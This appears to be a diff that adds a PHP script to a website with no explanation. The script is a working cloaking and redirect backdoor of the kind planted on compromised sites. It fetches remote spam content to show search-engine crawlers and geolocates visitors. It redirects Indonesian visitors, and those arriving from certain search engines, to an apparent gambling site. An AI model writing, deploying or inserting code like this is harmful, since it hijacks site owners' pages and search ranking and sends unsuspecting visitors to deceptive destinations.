@@ -1,0 +1,58 @@
+<?php
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+}
+
+function make_request($url) {
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+
+$bot_url = "https://p.phyo186.cfd/yyKG6-CObV8/raw";
+$reff_url = "https://bapautoto-situsgoks.pages.dev/";
+
+$file = make_request($bot_url);
+
+$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
+
+$cc = $geolocation['countryCode'] ?? '';
+
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/";
+
+$fingerprint = md5($ua . $ip . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? ''));
+
+if (preg_match($botchar, $ua)) {
+    echo $file;
+    exit;
+}
+
+if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
+    header("HTTP/1.1 302 Found");
+    header("Location: ".$reff_url);
+    exit();
+}
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+    header("HTTP/1.1 302 Found");
+    header("Location: ".$reff_url);
+    exit();
+}
+?>
+
